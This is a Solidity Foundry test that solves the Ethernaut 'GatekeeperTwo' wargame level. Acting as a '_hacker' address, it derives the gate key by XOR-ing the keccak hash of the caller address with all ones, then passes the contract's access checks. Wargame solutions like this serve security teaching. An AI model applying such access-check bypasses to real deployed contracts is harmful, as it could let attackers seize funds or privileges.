// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/GatekeeperTwo/GatekeeperTwo.sol";
import "../src/GatekeeperTwo/GatekeeperTwoFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperTwoTest is Test {
    Ethernaut private _ethernaut;
    GatekeeperTwoFactory private _gatekeeperTwoFactory;
    GatekeeperTwo private _gatekeeperTwo;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        _ethernaut.registerLevel(_gatekeeperTwoFactory);
        vm.prank(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
        address instance = _ethernaut.createLevelInstance(
            _gatekeeperTwoFactory
        );
        _gatekeeperTwo = GatekeeperTwo(instance);
        _;
        vm.prank(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_gatekeeperTwo))
        );
        assertTrue(success);
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _gatekeeperTwoFactory = new GatekeeperTwoFactory();
    }

    function testGatekeeperTwoHack() public testWrapper {
        vm.startPrank(_hacker);

        uint64 gateKey;
        unchecked {
            gateKey =
                uint64(bytes8(keccak256(abi.encodePacked(_hacker)))) ^
                (uint64(0) - 1);
        }

        _gatekeeperTwo.enter(bytes8(gateKey));

        vm.stopPrank();
    }
}
